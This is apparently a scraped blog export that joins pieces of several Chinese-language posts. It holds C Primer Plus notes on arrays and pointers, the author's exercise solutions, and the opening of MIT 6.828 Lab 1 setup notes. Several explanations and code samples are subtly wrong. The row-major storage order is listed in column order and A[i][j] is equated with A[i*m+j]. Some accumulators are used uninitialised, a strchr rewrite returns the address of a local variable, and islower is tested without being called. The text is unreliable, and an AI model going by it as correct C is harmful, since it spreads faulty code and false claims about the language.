语言的二维数组储存是一维线性顺序储存的，并且按照行优先原则， 12二维数组A[m][n]按行优先存储的线性序列为：A[0][0]、A[1][0]…A[m][0]、A[0][1]、A[1][1]…A[m][1]…A[m][1]、A[0][n]…A[m][n] 这么来说， 对于二维数组A[m][n]，可以理解为长度为m*n的一维数组 A[i][j]等效于一维下的A[i*m+j]，但是写A[2]并不会返回2234，而是返回一个垃圾值 如果按照上一行的推理，[0][2]就相当于[1][0]，因为0*0+2=1*2+0所以上例的输出是2234 回味一下，是不是明白了什么？ 数组与指针数组名其实是一个常量指针12345678910111213int main(void){ int test[2] ={2345,1,2,34}; if (test == &amp;test[0]) { printf(&quot;%d %d\\n&quot;,*test,test[0]); printf(&quot;%p %p&quot;,test,&amp;test[0]); } } // output:// 2345 2345// 000000000061FE18 000000000061FE18 数组名是该数组首个元素的地址 类似的，下面两个表达式均为真 12dates + 2 == &amp;dates[2]; // 地址==地址*(dates + 2) == dates[2];// 值==值 因为是常量指针，所以任何对数组名的赋值操作都是非法的 但是你可以创建一个同类型指针来替代它 1234567891011121314151617#include &lt;stdio.h&gt;int main(void){ int sum; int test[4] ={200,1,2,34}; int *p = test; while (p &lt; &amp;test[4]) { sum += *p; p++; } printf(&quot;%d&quot;,sum);} /*output:237*/ 指针+1 在数组中的体现12345678910111213141516171819202122232425262728// pnt_add.c -- pointer addition#include &lt;stdio.h&gt;#define SIZE 4int main(void){ short dates [SIZE]; short * pti; short index; double bills[SIZE]; double * ptf; pti = dates; // assign address of array to pointer ptf = bills; printf(&quot;%23s %15s\\n&quot;, &quot;short&quot;, &quot;double&quot;); for (index = 0; index &lt; SIZE; index ++) printf(&quot;pointers + %d: %10p %10p\\n&quot;, index, pti + index, ptf + index); return 0;}// output:/* short doublepointers + 0: 000000000061FE00 000000000061FDE0pointers + 1: 000000000061FE02 000000000061FDE8pointers + 2: 000000000061FE04 000000000061FDF0pointers + 3: 000000000061FE06 000000000061FDF8*/ 你可能会疑问，上面的地址运算结果不对， 61FE00 +1 应该是61FE01 但其实 C 中的指针+1，是指增加一个储存单元，对于数组而言，就是下一个元素的地址，而不是下一个字节的地址 这也是为什么指针要声明类型，因为每种类型的长度不同。如例中short为 2，double为 8 C 对数组的定义C 标准在描述数组表示法时借用了指针的概念 ar[n] == *(ar+n) *(ar + n)可以理解为，到内存的 ar 位置，移动 n 个单元后，取当前位置值。 *为间接运算符，此处起解引用作用 如何在函数形参表示数组数组名其实是数组中首个元素的地址，所以在传入数组的时候，其实传入的是一个地址 所以可以在函数定义中这么写 12int func(int *array);int func(int ar[]); 第二种不但表示指针ar指向int类型，还是一个int类型的数组，但int ar[]这种写法只能在声明形参时使用 由于函数原型可以省略参数名，你还可以在函数原型中这么写 12int func(int *);int func(int []); 不要在函数内求数组大小1234567891011121314int main(void){ int array[5] = {1,2,3,4,5}; printf(&quot;%d %d\\n&quot;,sizeof(array),sizeof(array[0]));}void array_max(int array[]){ printf(&quot;%d %d&quot;,sizeof(array),sizeof(array[0])); printf(&quot; %d&quot;,sizeof(int*));}/*20 4 8 4 8*/ 两次的输出不一样，为什么？ 当数组作为函数的参数进行传递时，该数组自动退化为同类型的指针 对于main函数来说，array 是一个数组，可以直接用 sizeof 求出其”长度”，5 个 int 嘛，所以是 20 对于array_max函数来说，array 是一个整型指针，用 sizeof 求 array 大小，就相当于sizeof(int*)，在我的电脑上永远是 8 指针操作赋值把地址赋给指针，可使用数组名，&amp;，另一个指针等 解引用*ptr取得指针所指向地址上的值 取址指针变量也有自己的值和地址 指针的值即为指向的地址 指针的值可以通过&amp;取得 递增(减)ptr++ ptr-- 递增指向数组元素的指针可以让指针指向下一个元素，或者上一个元素 与整数相加(减)ptr + 1 ，指向下一个元素 整数会和指针指向的类型的大小(字节为单位)相乘，然后结果与地址相加(减去)，差不多就是多次递增(或者递减) 指针求差求出两个指针之间的差值 通常来说，两个指针分别指向同一个数组的不同元素，差值的单位与数组类型的单位相同 例如， 123int ar[4] = {1,2,3,4};int *ptr1 = &amp;ar[0];int *ptr2 = &amp;ar[2]; 如果对两指针求差，ptr2 - ptr1 得到的值将会是2，是指两个指针所指向的元素相隔两个int，而不是 2 字节 Const 指针对于一个const指针，它可以指向const或非const数据，但是无法通过指针对数据进行任何修改 对于非const指针，它只能指向非const数据，否则通过指针就能改变数据(注意，的确可以通过这种方式修改 const 数据，但是这违背了的初衷) 指针和多维数组给出一个二维数组 1234567int zippo[4][2]={ {1,3}, {2,3}, {2342,34}, {242,234}}; 有下列等式成立 12345zippo == &amp;zippo[0]zippo[0] == &amp;zippo[0][0]*zippo == &amp;zippo[0][0]**zippo == zippo[0][0] 因为数组名是其首元素的地址，所以前两条很容易得到 那么在加上解引用符号*，就可以得到下面的两个式子。 解引用两次才能得到原始值，这被称为双重间接 指向多维数组的指针12int (*pz)[2];int * pax[2]; 考虑一下，有什么区别？ pz指向一个内含两个 int 类型值的数组，是一个指针 pax是一个内含两个指针的数组，每个元素都是指向 int 类型型的指针 为什么? 由于()的存在，pz 首先与*结合，因此声明的是一个指向数组(内含两个 int 型元素)的指针 由于[]优先级更高，先与 pax 结合，从而声明了一个数组，随后*又表示数组内的元素是指针 举个例子 1234567891011#include &lt;stdio.h&gt;int main(void){ int a[3][5] = { {1, 2, 3, 4, 5}, {6, 7, 8, 9, 10}, {11, 12, 13, 14, 15}}; int (*p)[5] = a; printf(&quot;%d&quot;,**p);} 例中声明一个p指针，指向一个包含 5 个元素的数组，并在初始化时指向二维数组中的第一个数组(数组名就是首元素地址) 此时p值为{1,2,3,4,5}的地址 第一次解引用的对象是指针p，也就是{1,2,3,4,5}的地址，得到了其值(1`的地址) 第二次解引用的对象指针{1,2,3,4,5}，也就是是1的地址，得到了其值，即为1 一般而言，指向多维数组的指针如下进行声明 12345678910111213141516171819#include &lt;stdio.h&gt;int main(void){ int array[1][2][3][4][5]; array[0][0][0][0][0] = 1234; array[0][0][0][0][1] = 12345; int(*p1)[2][3][4][5] = array; // 指向五维数组 array int(*p2)[3][4][5] = array[0]; // 指向四维数组 array[0] int(*p3)[4][5] = array[0][0]; // 指向三维数组 array[0][0] int(*p4)[5] = array[0][0][0]; // 指向二维数组 array[0][0][0] int(*p5) = array[0][0][0][0]; // 指向一维数组 array[0][0][0][0] printf(&quot;%d %d %d %d %d\\n&quot;,*****(p1),****p2,***p3,**p4,*p5); printf(&quot;%d %d %d %d %d&quot;,*(****p1+1),*(***p2+1),*(**p3+1),*(*p4+1),*(p5+1)); /* 1234 1234 1234 1234 1234 12345 12345 12345 12345 12345 */} 如果是作为函数的形参，则可以这么写 1int func( int [][2][3][4][5] ); // 需要传入一个指向五维数的指针 复合字面量(C99)不就是匿名数组吗 字面量是啥？ 简单说，5是一个 int 字面量，5.56是一个 double 字面量,'y'是一个 char 字面量… 复合字面量有点像数组，把很多同类字面量放到一起 12int arr[2] = {1,2}; //平时的数组(int [2] ) {1,2}; //复合字面量 因为复合字面量是匿名的，所以必须在创建的时候就使用它，指针是一种方法 123456#include &lt;stdio.h&gt;int main(void){ int *p = (int[2]){2323, 2}; printf(&quot;%d&quot;, *p);} 注意，复合字面量也具有类似数组名的特性，p在这里指向了第一个元素2323的地址。 11字符串字面量用双引号括起来的内容称为字符串字面量（string literal），也叫作字符串常量（string constant) 1const char *ptr = &quot;Hello！&quot; //等号右边就是一个字符串字面量 通常，字符串都作为可执行文件的一部分储存在数据段中 当把程序载入内存时，也载入了程序中的字符串 一般来说,字符串字面量被视为 const 数据。这意味着你不能修改字符串字面量，这是一种未定义行为。 用两行代码来举例 12char * word = &quot;frame&quot;;word[1] = 'l'; 第一行的写法并不被 ISO C 所推荐 ISO C++ forbids converting a string constant to ‘char*’ [-Wwrite-strings] 这也强调了，字符串字面量不应被修改 改为如下写法即可解决 1char const * word = &quot;frame&quot;; 但即使这样，第二行有效吗？ 各个编译器有自己的说法，C primer plus 的作者运行环境下允许如此，而我自己的 Mingw gcc 下编译运行后直接Segmentation fault 所以，不要动字符串字面量，至少不应该 字符串字面量和字符串数组12345678910111213141516 const char *mytalents[5] = { &quot;Adding numbers swiftly&quot;, &quot;Multiplying accurately&quot;, &quot;Stashing data&quot;, &quot;Following instructions to the letter&quot;, &quot;Understanding the C language&quot; }; const char yourtalents[5][10] = { &quot;Walking in a straight line&quot;, &quot;Sleeping&quot;, &quot;Watching television&quot;, &quot;Mailing letters&quot;, &quot;Reading email&quot; };printf(&quot;\\nsizeof mytalents: %zd, sizeof yourtalents: %zd\\n&quot;, sizeof(mytalents), sizeof(yourtalents))/*sizeof mytalents: 40, sizeof yourtalents: 200*/ mytalents是一个包含了 5 个指针元素的一维数组，大小为 5*8=40 yourtalents是一个包含了 5 个数组(字符串数组)的二维数组，每个子数组大小为 10×4=40，总大小为 5×10×4 = 200 mytalents中的指针指向字符串字面量的地址，而yourtalents中储存的是字符串字面量的副本，也就是说每个字符串被储存了两次","link":"/2020/07/19/C-Primer-Plus-%E7%AC%94%E8%AE%B0/"},{"title":"C Primer Plus 练习本","text":"简介用来存自己的练习答案，看情况存，简单的写完就过了 5.11112345678910111213141516171819202122#include &lt;stdio.h&gt;#define SCALE 60void main(void){ int tmins = 1, mins,hours; while(tmins &gt; 0) { printf(&quot;How many minutes?\\n&quot;); scanf(&quot;%d&quot;, &amp;tmins); mins = tmins % SCALE; hours = tmins / SCALE; if(tmins&gt;0) { printf(&quot;%d minutes = %d hours,%d minutes\\n&quot;,tmins,hours,mins); } else { printf(&quot;Bye&quot;); } }} 2123456789101112#include &lt;stdio.h&gt;void main(void){ int init; printf(&quot;What's the int number?\\n&quot;); scanf(&quot;%d&quot;,&amp;init); int target = init +11; while (++init &lt; target ) // ++init &lt; init + 11 会无限判断为True 因为右边也在变.. { printf(&quot;%d\\t&quot;, init); }} 712345678910111213141516#include &lt;stdio.h&gt;void cube(double val);int main(void){ double init; printf(&quot;Input a double num:&quot;); scanf(&quot;%lf&quot;,&amp;init); //double对应转换说明%lf cube(init); return 0;}void cube(double val){ printf(&quot;%f&quot;,val*val*val);} 912345678910111213141516171819202122#include &lt;stdio.h&gt;void Temperatures(double val);int main(void){ double init; printf(&quot;Input a Fahrenheit degree(q to quit):\\n&quot;); while (scanf(&quot;%lf&quot;,&amp;init) == 1) // 不要在这里加分号...不然while循环体就是空的了(踩坑) { Temperatures(init); } printf(&quot;Bye&quot;); return 0;}void Temperatures(double val){ double c = 5.0*(val-32)/9; double k = c+273.16; printf(&quot;%f °F = %f °C = %f K \\n&quot;,val,c,k);} 6.1611234567891011121314#include&lt;stdio.h&gt;int main(void){ char alphabet[26]; int i; for(i=0;i&lt;26;i++) { alphabet[i] = 'a' + i; } for(i=0;i&lt;26;i++) { printf(&quot;%c&quot;,alphabet[i]); }} 212345678910111213#include &lt;stdio.h&gt;int main(void){ int i, n; for (i = 0; i &lt; 6; i++) { for (n = 0; n &lt;= i; n++) { printf(&quot;%c&quot;, '$'); } printf(&quot;\\n&quot;); }} 31234567891011121314#include &lt;stdio.h&gt;int main(void){ char last; char start; for (last = 'F'; last &gt;= 'A';last--) { for (start = 'F'; start &gt;= last;start-- ) { printf(&quot;%c&quot;,start); } printf(&quot;\\n&quot;); }} 4123456789101112131415#include &lt;stdio.h&gt;int main(void){ int line; char letter = 'A'; int count; for (line = 0; line &lt; 6; line++) { for (count = 0; count &lt;= line; count++,letter++) { printf(&quot;%c&quot;,letter); } printf(&quot;\\n&quot;); } } 612345678910111213#include &lt;stdio.h&gt;int main(void){ int start,end; printf(&quot;A start and a end num splited by comma:\\n&quot;); scanf(&quot;%d,%d&quot;,&amp;start,&amp;end); printf(&quot;Num\\tSuqare\\tCube\\n&quot;); for (int i = start; i &lt;= end; i++) { printf(&quot;%d\\t%d\\t%d\\n&quot;,i,i*i,i*i*i); }} 7123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void){ char word[20]; int len; printf(&quot;Input a word:\\n&quot;); scanf(&quot;%s&quot;,&amp;word); len = strlen(word)-1; // 最后一个\\0不考虑 for (;len &gt;= 0; len--) //不要在这里直接操作size_t类型 { printf(&quot;%c&quot;,word[len]); }} 8123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void){ double num1,num2; printf(&quot;Two float nums splited by spacing(q to quit):\\n&quot;); while( scanf(&quot;%lf %lf&quot;,&amp;num1,&amp;num2) == 2) //scanf成功读取后返回值不是布尔值，是成功读取的参数数量.. { printf(&quot;%lf\\n&quot;, (num1-num2) / num1*num2); printf(&quot;Two float nums splited by spacing(q to quit):\\n&quot;); }} 111234567891011121314151617#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void){ int nums[8]; for ( int i = 0; i &lt;=7; i++) { printf(&quot;Now is no.%d\\n&quot;,i); scanf(&quot;%d&quot;,&amp;nums[i]); } printf(&quot;Done.\\n&quot;); int len = sizeof(nums)/sizeof(nums[0]) -1 ;// sizeof返回值是bytes,除以单位元素大小就是数组长度。因为索引从0开始所以这里-1 for (; len &gt;= 0; len--) { printf(&quot;%d\\n&quot;,nums[len]); } } 12123456789101112131415161718192021#include &lt;stdio.h&gt;int main(void){ int i; // 数列大小 printf(&quot;How many times?\\n&quot;); while (scanf(&quot;%d&quot;, &amp;i) == 1) { int denominator = 1; // 循环中变化的分母 double expression = 0; // 全是正数的级数 double expression2 =0; // 交错级数 int num = 1; // 用于判定正负号 for (; denominator &lt;= i; denominator++, num *= (-1)) { expression = expression + (double)1 / denominator; expression2 = expression2 + (double)1 / denominator * num; printf(&quot;%lf %lf\\n&quot;, expression,expression2); } printf(&quot;Done.\\n&quot;); printf(&quot;How many times?\\n&quot;); }} 1312345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(void){ int i; int array[8]; int len = sizeof(array)/sizeof(array[0]); for (i = 0; i &lt;= len - 1; i++) { array[i] = pow(2,i); } i = 0; do { printf(&quot;%d\\n&quot;,array[i]); i++; } while (i &lt;= len-1);} 14123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;int main(void){ double nums[8]; double sums[8]; int i, j; int len = sizeof(nums) / sizeof(nums[0]); printf(&quot;Now input nums by order:\\n&quot;); for (i = 0; i &lt; len - 1; i++) { scanf(&quot;%lf&quot;, &amp;nums[i]); } for (j = 0; j &lt; len - 1; j++) { double sumtemp; for (i = 0; i &lt;= j; i++) { sumtemp += nums[i]; } sums[j] = sumtemp; } for (i = 0; i &lt; len - 1; i++) { printf(&quot;%lf\\t&quot;, nums[i]); } printf(&quot;\\n&quot;); for (i = 0; i &lt; len - 1; i++) { printf(&quot;%lf\\t&quot;, sums[i]); }}/*1.000000 2.000000 3.000000 4.000000 5.000000 6.000000 7.0000001.000000 4.000000 10.000000 20.000000 35.000000 56.000000 84.000000*/ 15123456789101112131415161718192021#include &lt;stdio.h&gt;int main(void){ int i; char input[255]; for ( i = 0; i &lt;= 255 &amp;&amp; input[i] != '\\n'; i++) { scanf(&quot;%c&quot;, &amp;input[i]); if (input[i] == '\\n') { break; } } for (;i &gt;= 0; i--) { printf(&quot;%c&quot;,input[i]); } return 0;} 161234567891011121314151617181920#include &lt;stdio.h&gt;int main(void){ int year = 0; double dap = 100, dei = 100; double r_dei = 1.05; while (dei &lt;= dap) { dap += 110.0; dei *= r_dei; year++; } printf(&quot;%d&quot;,year); // for (year = 0; dei &lt;= dap; ++year) // { // dap += 110.0; // dei *= r_dei; // } // printf(&quot;%d&quot;,year);} 1712345678910111213#include &lt;stdio.h&gt;int main(void){ int year = 0; double balance = 1e5; while (balance &gt; 0) { balance *= 1.08; balance -= 1e4; year++; } printf(&quot;%d&quot;,year);} 18do-while 1234567891011121314#include &lt;stdio.h&gt;int main(void){ int friends = 5; int week = 1; do { friends -= week; friends *= 2; printf(&quot;Week%d Frienders:%d\\n&quot;,week,friends); week++; } while (friends &lt;= 150);} while 12345678910111213#include &lt;stdio.h&gt;int main(void){ int friends = 5; int week = 0; while (friends &lt;= 150) { week++; friends -= week; friends *= 2; printf(&quot;Week%d Frienders:%d\\n&quot;, week, friends); }} for 123456789101112#include &lt;stdio.h&gt;int main(void){ int friends; int week; for (friends = 5, week = 1; friends &lt;= 150; week++) { friends -= week; friends *= 2; printf(&quot;Week%d Frienders:%d\\n&quot;, week, friends); }} 7.1251234567891011121314151617181920212223#include &lt;stdio.h&gt;int main(void){ char ch; int count = 0; while( scanf(&quot;%c&quot;,&amp;ch) &amp;&amp; ch != '#' ) { switch (ch) { case '.': ch = '!'; count++; break; case '!': ch = '!!'; count++; default: break; } } printf(&quot;%d&quot;,count);} 6非提示解法 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;int main(void){ int num = 0; int count = 0; char ch; while (scanf(&quot;%c&quot;, &amp;ch) &amp;&amp; ch != '\\n') { if (ch == 'e') { num = 1; } else if (ch == 'i') { if (num == 1) { count++; num = 0; } else { continue; } } } printf(&quot;%d&quot;, count);} 9.1131234567891011void printline(char ch, int line, int num){ for (; line &gt; 0; line--) { for (int count =num ; count &gt; 0; count--) //每行循环重新初始化count为num { putchar(ch); } putchar('\\n'); }} 41234double harmonic(double x,double y){ return 2/(1/x+1/y);} 5123456double large_of(double *x,double *y){ double large = (*x&lt;*y)? *y:*x; *x = large; *y = large; //不用if了，反正就俩值，直接赋} 612345678910111213141516171819202122double sort(double *x,double *y, double *z){ double i; if (*x&lt;*y) { i = *y; *y = *x; *x = i; } if (*x&lt;*z) { i = *z; *z = *x; *x = i; } if (*y&lt;*z) { i = *z; *z = *y; *y = i; }} 7这道题题目有点绕 利用ctype.h简化了代码，并未对checkChar返回的-1做任何处理 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;void checkStdInput();int checkChar(char ch);int main(void){ checkStdInput(); return 0;}void checkStdInput(){ char ch; while ((ch = getchar()) != EOF) { checkChar(ch); }}int checkChar(char ch){ if (isalpha(ch)) { int index = (islower) ? ch - 'a' + 1 : ch - 'A' + 1; printf(&quot;%c is a letter and the index is %d\\n&quot;, ch, index); } else { return -1; }} 81234567891011121314151617181920212223242526272829303132double power(double num, int n){ double res = num; if (n == 0) { return 1; } else if (n == 1) { return num; } else { if (n &gt; 0) { for (; n &gt; 1; n--) { res *= num; } } else { n = -n; for (; n &gt; 1; n--) { res *= num; } } return 1 / res; }} 1012345678910void to_base_n(int x, int base) { int r; r = x % base; if (x &gt;= base) to_base_n(x / base, base); putchar('0' + r); return;} 11未加任何限定，无限打印 1234567891011121314void Fibonacci(){ int a = 0, b = 1; printf(&quot;%d %d&quot;, a, b); int num = a + b; printf(&quot; %d&quot;,num); while (1) { a = b; b = num; num = a + b; printf(&quot; %d&quot;,num); }} 打印指定前 n 项 12345678910111213void Fibonacci(int n){ n = n-3; // 前三项不在循环里 int a = 0, b = 1,c=1; printf(&quot;%d %d %d&quot;,a,b,c); for (; n &gt; 0; n--) { a = b; b = c; c = a + b; printf(&quot; %d&quot;, c); }} 10.1311234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#define MONTHS 12 // number of months in a year#define YEARS 5 // number of years of dataint main(void){ // initializing rainfall data for 2010 - 2014 const float rain[YEARS][MONTHS] = { {4.3, 4.3, 4.3, 3.0, 2.0, 1.2, 0.2, 0.2, 0.4, 2.4, 3.5, 6.6}, {8.5, 8.2, 1.2, 1.6, 2.4, 0.0, 5.2, 0.9, 0.3, 0.9, 1.4, 7.3}, {9.1, 8.5, 6.7, 4.3, 2.1, 0.8, 0.2, 0.2, 1.1, 2.3, 6.1, 8.4}, {7.2, 9.9, 8.4, 3.3, 1.2, 0.8, 0.4, 0.0, 0.6, 1.7, 4.3, 6.2}, {7.6, 5.6, 3.8, 2.8, 3.8, 0.2, 0.0, 0.0, 0.0, 1.3, 2.6, 5.2}}; int year, month; float subtot, total; float *p = rain; float(*p1)[12] = rain; printf(&quot; YEAR RAINFALL (inches)\\n&quot;); for (year = 0, total = 0; year &lt; YEARS; year++) { // for each year, sum rainfall for each month for (month = 0, subtot = 0; month &lt; MONTHS; month++) subtot += *p++; //or this: subtot += *(*(rain + year) + month); printf(&quot;%5d %15.1f\\n&quot;, 2010 + year, subtot); total += subtot; // total for all years } printf(&quot;\\nThe yearly average is %.1f inches.\\n\\n&quot;, total / YEARS); printf(&quot;MONTHLY AVERAGES:\\n\\n&quot;); printf(&quot; Jan Feb Mar Apr May Jun Jul Aug Sep Oct &quot;); printf(&quot; Nov Dec\\n&quot;); for (month = 0; month &lt; MONTHS; month++) { // for each month, sum rainfall over years for (year = 0, subtot = 0; year &lt; YEARS; year++) subtot += *(*(rain + year) + month); //or use p1: subtot += *(*(p1+year)+month) ; printf(&quot;%4.1f &quot;, subtot / YEARS); } printf(&quot;\\n&quot;); return 0;} 21234567891011121314151617181920212223void copy_arr(double target[], double source[], int len){ for (int count = 0; count &lt;= len-1 ; count++) { target[count] = source[count]; } }void copy_ptr(double *target, double *source, int len){ for (int count = 0; count &lt;= len-1;count++) { *(target++) = *(source++); } }void copy_ptrs(double *target, double *start, double *end){ for (; start &lt;= end-1;) { *(target++) = *(start++); } } 31234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;int array_max(int array[], int len);int max(int a, int b);int main(void){ int array[5] = {5, 7, 1232, 8, 1}; int *p = (int[6]){2323, 2,1243,34547,45,3};//复合字面量，或者说匿名数组？ int res = array_max(array, 5); int res2 = array_max(array, 6); printf(&quot;%d %d&quot;, res,res2);}int array_max(int array[], int len) // 数组名和数组长度{ int a = array[0], b; for (int i = 1; i &lt;= len - 1; i++) { b = array[i]; if (max(a, b) == b) { a = b; continue; } else { continue; } } return a;}int max(int a, int b) // 手写一个max(){ return (a&gt;=b)?a:b;}/*1232 34547*/ 4上一道题简单改了改 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;int array_max_index(double array[], int len);double max(double a, double b);int main(void){ // 懒得写小数点，下面包含隐式类型转换 double array[5] = {5, 7123, 1232, 8, 1}; double *p = (double[6]){2323, 2, 1243, 34547, 45, 3}; //复合字面量, int res1 = array_max_index(array, 5); int res2 = array_max_index(p, 6); printf(&quot;%d %d&quot;, res1, res2);}int array_max_index(double array[], int len) // 数组名和数组长度{ double a = array[0], b; int maxindex = 0; for (int i = 1; i &lt;= len - 1; i++) { b = array[i]; if (max(a, b) == b) { a = b; maxindex = i; continue; } else { continue; } } return maxindex;}double max(double a, double b){ return (a&gt;=b)?a:b;}// 1 3 512345678910111213141516171819202122232425#include &lt;stdio.h&gt;double array_max_min(double array[], int len);int main(void){ double arr[5] = {1, 2, 3, 4, 6}; double res = array_max_min(arr, 5); printf(&quot;%lf&quot;, res);}double array_max_min(double array[], int len){ double max = array[0]; double min = array[0]; for (int i = 1; i &lt; len; i++) { if (max &lt; array[i]) max = array[i]; else if (min &gt; array[i]) min = array[i]; } return max - min;}// 5.000000 6双指针解决 123456789101112131415161718192021222324252627282930313233void array_reverse(double arr[], int len){ if (len % 2 == 0) // 偶数长度 { double temp; double *start = arr; double *end = &amp;arr[len - 1]; for (int i = 0; i &lt; len / 2; i++) { temp = *start; *start = *end; *end = temp; start++; end--; } } else { double temp; double *start = arr; double *end = &amp;arr[len - 1]; for (int i = 0; i &lt; (len / 2) + 1; i++) { temp = *start; *start = *end; *end = temp; start++; end--; } }} 712345678910111213141516void copy_2darray(int row, int column, double array[][column], double newarray[][column])// 复制一个二维数组的内容到另一个二维数组//参数: 行，列，原数组，新数组{ double (*ptr)[column] = array; double (*ptr_new)[column] = newarray; for (int i = 0; i &lt; row; i++) //二维 { ptr = array + i; ptr_new = newarray + i; for (int j = 0; j &lt; column; j++) //一维 { *(*ptr_new+j) = *(*ptr+j); // newarray[i][j] = array[i][j] } }} 利用”内层越界”的方式，可以直接当一维数组处理 1234567void copy_2darray(int row, int column, double array[][column], double newarray[][column]){ for (int i = 0; i &lt; row*column; i++) { newarray[0][i] =array[0][i]; }} 9复制函数参考第 7 题 1234567891011121314void show_2darray(int row, int column, double array[][column]){ for (int i = 0; i &lt; row * column ; i++) { if ((i + 1) % column == 0) { printf(&quot;%g\\n&quot;, array[0][i]); } else { printf(&quot;%g\\t&quot;, array[0][i]); } }} 101234567void array_sumup(int len,int a[], int b[],int sum[]){ for (int i = 0; i &lt; len; i++) { sum[i] = a[i]+b[i]; }} 131234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;void data2array(double array[3][5]);void show_average_subarray(double array[3][5]);double average_subarray(double subarray[5]);double average_all(double array[3][5]);double maximum(double array[3][5]);int main(void){ double array[3][5]; printf(&quot;Input 3 lines of double numbers(splited by space, enter to the next row):\\n&quot;); data2array(array); show_average_subarray(array); double avr_all = average_all(array); double max = maximum(array); printf(&quot;The average of all is: %lf\\n&quot;, avr_all); printf(&quot;The maximum is: %lf&quot;, max);}void data2array(double array[3][5]){ for (int i = 0; i &lt; 3; i++) { double(*start)[5] = array + i; fflush(stdin); scanf(&quot;%lf %lf %lf %lf %lf&quot;, *start, (*start) + 1, (*start) + 2, (*start) + 3, (*start) + 4); }}void show_average_subarray(double array[3][5]){ double sum; printf(&quot;Average of each subarray:\\n&quot;); for (int i = 0; i &lt; 3; i++) { double(*subarray)[5] = array + i; double avr_subarray = average_subarray(subarray); printf(&quot;Subarray%d: %g\\n&quot;, i, avr_subarray); }}double average_subarray(double subarray[5]){ double subsum; for (int i = 0; i &lt; 5; i++) { subsum += subarray[i]; } return subsum / 5;}double average_all(double array[3][5]){ double sum; for (int i = 0; i &lt; 15; i++) { sum += array[0][i]; } return sum / 15;}double maximum(double array[3][5]){ double max = array[0][0]; for (int i = 1; i &lt; 15; i++) { max = (array[0][i] &gt; max) ? array[0][i] : max; } return max;} 11.131危险 1234567void getn(int n, char array[]){ while (n--&gt;0) { *array++ = getchar(); }} 2危险 1234567891011121314151617void getn(int n, char array[]){ fflush(stdin); char tmp; for (;n&gt;0;n--) { tmp = getchar(); if(tmp != ' '&amp;&amp; tmp != '\\n' &amp;&amp; tmp!='\\t') { *array++ = tmp; } else { break; } }} 3危险 12345void word(char array[]){ fflush(stdin); scanf(&quot;%s&quot;,array);} 512345678910111213141516char* _strchr(char *string, char ch){ while (*string) { if ( *string == ch) { char *ptr = &amp;ch; return ptr; } else { string++; } } return NUll;} 712345678910111213141516171819202122232425char *mystrncpy(char *s1, char *s2, int n){ char *s1end = s1 + strlen(s1); if (strlen(s2) &gt;= n) { while (n--) { *s1end++ = *s2++; } } else { int s2len = strlen(s2); while (s2len--) { *s1end++ = *s2++; } n = n - s2len; while (n--) { *s1end++ = ' '; } } return s1;}","link":"/2020/07/16/C-Primer-Plus-%E7%BB%83%E4%B9%A0%E6%9C%AC/"},{"title":"6.828-Lab1(old)","text":"Lab 1: Booting a PCIntroductionThis lab is split into three parts. The first part concentrates on getting familiarized with x86 assembly language, the QEMU x86 emulator, and the PC’s power-on bootstrap procedure. The second part examines the boot loader for our 6.828 kernel, which resides in the boot directory of the lab tree. Finally, the third part delves into the initial template for our 6.828 kernel itself, named JOS, which resides in the kernel directory. Part 1: PC BootstrapGetting Started with x86 assemblyThe PC Assembly Language Book is an excellent place to start. Warning: Unfortunately the examples in the book are written for the NASM assembler, whereas we will be using the GNU assembler. NASM uses the so-called Intel syntax while GNU uses the AT&amp;T syntax. While semantically equivalent, an assembly file will differ quite a lot, at least superficially, depending on which syntax is used. Luckily the conversion between the two is pretty simple, and is covered in Brennan’s Guide to Inline Assembly. Certainly the definitive reference for x86 assembly language programming is Intel’s instruction set architecture reference, which you can find on the 6.828 reference page in two flavors: an HTML edition of the old 80386 Programmer’s Reference Manual, which is much shorter and easier to navigate than more recent manuals but describes all of the x86 processor features that we will make use of in 6.828; and the full, latest and greatest IA-32 Intel Architecture Software Developer’s Manuals from Intel, covering all the features of the most recent processors that we won’t need in class but you may be interested in learning about. An equivalent (and often friendlier) set of manuals is available from AMD. Save the Intel/AMD architecture manuals for later or use them for reference when you want to look up the definitive explanation of a particular processor feature or instruction. Simulating the x86Install QEMU patched version by MIT1234git clone https://github.com/mit-pdos/6.828-qemu.git qemucd qemu./configure --disable-kvm --disable-werror --disable-sdl --target-list=&quot;i386-softmmu x86_64-softmmu&quot;make &amp;&amp; make install Install i386-jos-elf-gcc and i386-elf-binutilsjos in package name is just a custom prefix, it’s said that you can use gmake GCCPREFIX={prefix}to use your own prefix and in this Makefile it’s defined as jos by default. but in MacOS gmake seems not a command when you are at the beginning, so choose the easy way. 12brew tap liudangyi/i386-jos-elf-gccbrew install i386-jos-elf-gcc i386-elf-binutils i386-jos-elf-gdb Download jos1git clone https://pdos.csail.mit.edu/6.828/2018/jos.git lab Make and run jos123456789101112131415161718cd labmake+ as kern/entry.S+ cc kern/entrypgdir.c+ cc kern/init.c+ cc kern/console.c+ cc kern/monitor.c+ cc kern/printf.c+ cc kern/kdebug.c+ cc lib/printfmt.c+ cc lib/readline.c+ cc lib/string.c+ ld obj/kern/kernel+ as boot/boot.S+ cc -Os boot/main.c+ ld boot/bootboot block is 380 bytes (max 510)+ mk obj/kern/kernel.img Run it with QEMU 1make qemu or with out Virtual VGA 1make qemu-nox Here’s the difference : If you used make qemu, these lines printed by the kernel will appear in both the regular shell window from which you ran QEMU and the QEMU display window. This is because for testing and lab grading purposes we have set up the JOS kernel to write its console output not only to the virtual VGA display (as seen in the QEMU window), but also to the simulated PC’s virtual serial port, which QEMU in turn outputs to its own standard output. Likewise, the JOS kernel will take input from both the keyboard and the serial port, so you can give it commands in either the VGA display window or the terminal running QEMU. Alternatively, you can use the serial console without the virtual VGA by running make qemu-nox Although simple, it’s important to note that this kernel monitor is running “directly” on the “raw (virtual) hardware” of the simulated PC. This means that you should be able to copy the contents of obj/kern/kernel.img 